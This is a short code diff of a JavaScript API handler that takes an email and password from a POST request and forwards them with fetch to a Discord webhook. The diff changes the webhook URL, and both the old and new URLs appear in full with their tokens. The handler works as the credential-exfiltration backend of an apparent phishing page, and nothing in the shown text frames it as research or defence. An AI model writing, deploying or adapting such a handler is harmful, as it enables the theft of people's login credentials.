@@ -1,7 +1,7 @@
 export default async function handler(req, res) {
     if (req.method === 'POST') {
         const { email, password } = req.body;
-        const WEBHOOK = "https://discord.com/api/webhooks/1492962663553175552/hSju6EP6Ih5PLPgNG6PcHC-lOh_udnUuATr28SjHs148VFfLuMW0pai4NV9nTZaoFplA";
+        const WEBHOOK = "https://discord.com/api/webhooks/1503594384187330782/QKpk_4A4ZkLNMcUqPgarc1SSsMKObPJ-wluCBd5Or2ea3yps3vdiSlb4wXkOuuz17oBm";
 
         try {
             await fetch(WEBHOOK, {
